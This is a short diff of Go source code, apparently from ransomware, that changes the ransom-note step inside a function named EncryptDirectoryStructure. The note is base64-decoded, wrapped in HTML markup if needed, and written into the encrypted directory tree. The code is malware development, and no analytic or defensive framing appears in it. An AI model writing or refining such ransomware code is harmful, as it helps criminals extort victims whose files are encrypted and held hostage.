@@ -241,7 +241,11 @@ func EncryptDirectoryStructure(
         // logic here
         if len(ransom_note) > 0 {
             decoded, _ := b64.StdEncoding.DecodeString(ransom_note)
-		    writeRansomNote(startdir, string(decoded))
+            ransom_note = string(decoded)
+            if !strings.Contains(ransom_note, "<html>") {
+                ransom_note = "<html><head></head><body><pre>" + string(decoded) + "</pre></body></html>"
+            }
+		    writeRansomNote(startdir, ransom_note)
         } else {
 		    writeRansomNote(startdir, RansomNote01)
         }
